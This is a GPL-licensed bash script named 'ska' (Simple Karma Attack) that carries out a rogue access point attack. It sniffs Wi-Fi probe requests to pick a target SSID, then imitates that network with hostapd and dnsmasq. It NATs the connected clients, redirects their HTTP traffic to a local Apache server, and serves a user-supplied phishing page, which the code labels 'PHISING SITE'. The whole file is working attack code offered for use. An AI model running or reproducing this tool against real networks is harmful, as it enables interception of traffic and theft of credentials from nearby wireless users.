#!/bin/bash


# ska    -    Simple Karma Attack
# Copyright © 2019 Leviathan36 

# ska is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# ska is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with ska.  If not, see <http://www.gnu.org/licenses/>.


############################################################
                        # FUNCTIONS #
############################################################

: <<STEPS
0. select NICs
1. capture probe-req
2. active fake ap
3. enable HTTP redirection
4. enable ssl strip
5. enable apache server
STEPS


print() {
    
    case "$1" in
        
        '-i')
            printf "\033[34;1m[*] $2\033[0m\n"
            ;;
        
        '-w')
            printf "\033[33;1m[!] $2\033[0m\n"
            ;;
        
        '-s')
            printf "\033[32;1m[+] $2\033[0m\n"
            ;;
        
        '-f')
            printf "\033[35;1m[-] $2\033[0m\n"
            ;;
        
        *)
            printf "\033[35;1m[-] ERROR: parameter missing! (print function)\033[0m\n"
            return 1
            ;;
        
    esac
    
    return 0
    
}


turn_on_all_nic() {
    
    for INTERFACE in `ls /sys/class/net`; do
        sudo ifconfig "$INTERFACE" up
    done
    
}


# param1: 'question phrase for NIC selection'
# param2: 'output variable'
select_interface() {
    read -p "$(printf "$1:\n"; ls '/sys/class/net' | nl; printf "\n>>> ")" CHOICE
    ls -1 '/sys/class/net' | sed "${CHOICE}q;d"
    
}


# param1: 'question phrase for TARGET selection'
# param2: 'output variable'
select_target () {
    
    read -p "$(printf "$1:\n"; (cat '/tmp/ska_targets.txt'; echo 'manual input') | nl; printf "\n>>> ")" CHOICE
    cat '/tmp/ska_targets.txt' | sed "${CHOICE}q;d"
    
}


# take one parameter: the NIC name
channel_hop() {

	IEEE80211bg="1 2 3 4 5 6 7 8 9 10 11"
	
	while true ; do
		for CHAN in "$IEEE80211bg" ; do
			sudo iwconfig "$1" channel "$CHAN"
			sleep 3
		done
	done
}


sniff_probe_req_select_ap() {
    
    # select NIC
    SNIFFER_NIC=$(select_interface 'SELECT SNIFFER INTERFACE' | tail -n1)
    
    # activate channel hop
    channel_hop "$SNIFFER_NIC" &
    channel_hop_pid="$!"
    
    # tcpdump (right bottom corner) # sudo xterm -geometry 80x25+10000+10000 -e
    sudo bash -c "tcpdump -vvv --immediate-mode -l -I -i ${SNIFFER_NIC} -e -s 256 type mgt subtype probe-req > /tmp/ska_tcpdump_output.txt" &
    tcpdump_pid="$!"
    
    # set custom trap to kill channel_hop, tcpdump
    trap 'sudo kill "$channel_hop_pid"; printf "\n\n"; print -s "channel_hop killed\n\n"; sudo kill "$tcpdump_pid"; sleep 3; printf "\n"; print -s "tcpdump killed\n\n"; trap - SIGINT; break' SIGINT
    
    # clean targets file
    sudo bash -c 'echo "" > /tmp/ska_targets.txt'
    
    # print targets found
    while true; do
        cut -f 7,10,15,16,19  -d ' ' '/tmp/ska_tcpdump_output.txt' | sort | uniq | tr ' ' ' -- ' | tee '/tmp/ska_targets.txt'
        sleep 3
        clear
    done
    
    # reset trap SIG
    trap - SIGINT
    
    # select target
    TARGET=$(select_target 'SELECT TARGET' | tail -n1)

}

create_hostapd_conf_file() {
    
    cat <<END > "/tmp/hostapd.conf"
# Wireless interface config
interface=${LAN_NIC}
driver=nl80211
ssid=${SSID_TARGET}
channel=${CHANNEL_TARGET}
#wpa=2
#wpa_passphrase=
END

}


create_dnsmasq_conf_file() {
    
    # create IP array
    IFS='.'
    IP_ARRAY=($LAN_NIC_IP)
    unset IFS
    
    cat <<END > "/tmp/dnsmasq.conf"
# Listening interface.
interface=${LAN_NIC}

# Override the default route supplied by dnsmasq, which assumes the
# router is the same machine as the one running dnsmasq.
dhcp-option=3,${LAN_NIC_IP}

# If you wish to pass through the DNS servers from your ISP, you can use the following parameters
dhcp-option=6,8.8.8.8, 8.8.4.4

# This is an example of a DHCP range where the netmask is given. This
# is needed for networks we reach the dnsmasq DHCP server via a relay
# agent. If you don't know what a DHCP relay agent is, you probably
# don't need to worry about this.
# dhcp-range=192.168.0.50,192.168.0.150,255.255.255.0,12h
dhcp-range=${IP_ARRAY[0]}.${IP_ARRAY[1]}.${IP_ARRAY[2]}.$((IP_ARRAY[3] + 1)),${IP_ARRAY[0]}.${IP_ARRAY[1]}.${IP_ARRAY[2]}.$((IP_ARRAY[3] + 20)),255.255.255.0,12h

# For debugging purposes, log each DNS query as it passes through dnsmasq.
log-queries
END

}

create_fake_site() {
    
    APACHE_CONF_FILE='/etc/apache2/sites-enabled/000-default.conf'
    
    # check if apache is installed
    if ! which apache2 > /dev/null; then
        print -w 'Probably apache2 is not installed!'
        return 0
    fi
    
    if grep 'ErrorDocument 404' "$APACHE_CONF_FILE"; then
        
        print -w "Your apache conf file: $APACHE_CONF_FILE already contains the directive about the error page!"
        read -p 'Would you like to continue (y/n)? >>> ' CHOICE
        
        if [[ "$CHOICE" != 'Y' && "$CHOICE" != 'y' ]]; then
        
            print -f 'Fake site not created!'
            return 0
        fi
    
    fi
        
    # PHISING SITE
    read -p 'CREATE FAKE SITE [y/n]? >>> ' FAKE_SITE_CHOICE
    if [[ "$FAKE_SITE_CHOICE" == 'Y' || "$FAKE_SITE_CHOICE" == 'y' ]]; then
        
        # ask for the path of fake site
        read -p 'INSERT THE PATH OF FAKE PAGE >>> ' FAKE_SITE_PATH

        # move the fake site into document root
        print -i "Modifying  $APACHE_CONF_FILE  file"
        DOCUMENT_ROOT=$(grep 'DocumentRoot' "$APACHE_CONF_FILE" | cut -f2 -d ' ')
        sudo cp "$FAKE_SITE_PATH" "$DOCUMENT_ROOT"
        
        # change index.html
        sudo mv "$DOCUMENT_ROOT"/index.html "$DOCUMENT_ROOT"/index.html.copy
        sudo mv "$DOCUMENT_ROOT"/$(basename $FAKE_SITE_PATH) "$DOCUMENT_ROOT"/index.html

        # change the ErrorDocument rule
        print -i 'Changing default error page'
        sudo sed -i "/DocumentRoot/a \ \ \ \ \ \ \ \ ErrorDocument 404 /$(basename $FAKE_SITE_PATH)" "$APACHE_CONF_FILE"
        
        # restart apache
        print -i 'Restarting Apache2...'
        sudo service apache2 restart
        print -s 'Apache2 restarted!'
    
    else
        
        return 0
    
    fi
    
}


reset_and_killall() {

    # for good formatting
    echo

    # kill dnsmasq
    sudo kill "$DNSMASQ_PID"
    print -s 'dnsmasq killed'
    
    # kill hostapd
    sudo killall hostapd
    print -s 'hostapd killed'
    
    # disable NAT for outgoing packets from WAN nic
    print -i 'Restoring IP config...'
    sudo iptables -t nat -D POSTROUTING -o "$WAN_NIC" -j MASQUERADE # sudo iptables -t nat -v -L

    # disable HTTP traffic redirection to local server
    sudo iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination "$LAN_NIC_IP":80
    
    # delete IP addr from NIC
    sudo ip addr del "$LAN_NIC_IP"/24 dev "$LAN_NIC"
    
    # disable IP forwarding
    sudo bash -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'
    
    print -s 'IP config restored'
    
    # restore apache file
    if [[ "$FAKE_SITE_CHOICE" == 'Y' || "$FAKE_SITE_CHOICE" == 'y' ]]; then
        print -i 'Restoring Apache conf...'
        if [[ ! -z "$APACHE_CONF_FILE" ]]; then
            sudo sed -i '/ErrorDocument 404/d' "$APACHE_CONF_FILE"
        fi
        sudo rm "$DOCUMENT_ROOT"/index.html
        sudo mv "$DOCUMENT_ROOT"/index.html.copy "$DOCUMENT_ROOT"/index.html
        print -s 'Apache conf restored'
    fi
    
    printf "\nPRESS ENTER TO EXIT >>> "
    
}

############################################################
                        # MAIN #
############################################################

# select two NIC for the attack
turn_on_all_nic
LAN_NIC=$(select_interface 'SELECT LAN INTERFACE' | tail -n1)
WAN_NIC=$(select_interface 'SELECT WAN INTERFACE' | tail -n1)

# check NetworkManager conf
if which NetworkManager > /dev/null; then

    NM_DNS_CONF=$(grep 'dns=dnsmasq' '/etc/NetworkManager/NetworkManager.conf')
    if [[ "${NM_DNS_CONF:0:1}" != '#' ]]; then
        print -w 'Probably NetworkManager will interfere with dnsmasq!'
    fi

    NM_DEV_CONF=$(grep 'unmanaged-devices' '/etc/NetworkManager/NetworkManager.conf')
    if ! grep -q $(cat /sys/class/net/$LAN_NIC/address) <<< "$NM_DEV_CONF"; then
        print -i 'Probably NetworkManager will interfere with your NIC!'
    fi

fi

# collect probe-req and select the target
read -p "SNIFF PROBE-REQ TO FIND THE TARGET? [y/n] >>> " SNIFF_CHOICE
if [[ "$SNIFF_CHOICE" == 'Y' || "$SNIFF_CHOICE" == 'y' ]]; then
    sniff_probe_req_select_ap
fi

if [[ "$TARGET" == '' ]]; then
    read -p 'INSERT TARGET NAME (SSID) >>> ' SSID_TARGET
    read -p 'INSERT TARGET CHANNEL >>> ' CHANNEL_TARGET
else
    SSID_TARGET=$(cut -f2 -d ' ' <<< TARGET | sed -r 's/[()]+//g')
    CHANNEL_TARGET=$(cut -f2 -d ' ' <<< TARGET)
fi


# start hostapd (right top corner)
sudo killall hostapd &> /dev/null
create_hostapd_conf_file
sudo xterm -geometry '80x25+10000+0' -e 'hostapd /tmp/hostapd.conf' &
HOSTAPD_PID="$!"

# assign ip to LAN nic
: <<WARNING
don't use the same IP range of the WAN
WARNING
read -p 'CHOICE THE IP RANGE FOR FAKE LAN NETWORK >>> ' LAN_NIC_IP
sudo ifconfig "$LAN_NIC" "$LAN_NIC_IP" up

# start dnsmasq (right bottom corner)
sudo killall dnsmasq &> /dev/null
create_dnsmasq_conf_file
sudo xterm -geometry '80x25+10000+10000' -e 'dnsmasq -C /tmp/dnsmasq.conf -d' &
DNSMASQ_PID="$!"



# enable IP forwarding
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# active NAT for outgoing packets from WAN nic
sudo iptables -t nat -A POSTROUTING -o "$WAN_NIC" -j MASQUERADE # sudo iptables -t nat -v -L
print -i 'NAT for outgoing packets activated'

# redirect HTTP traffic to local server
: << WARNING
if the redirection don't work could be an overlap of the iptables rules in the PREROUTING chain
WARNING
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${LAN_NIC_IP}:80
print -i 'HTTP traffic redirected to local server'

# enable fake site
create_fake_site

# trap (reset last three options)
trap reset_and_killall SIGINT
read NULL
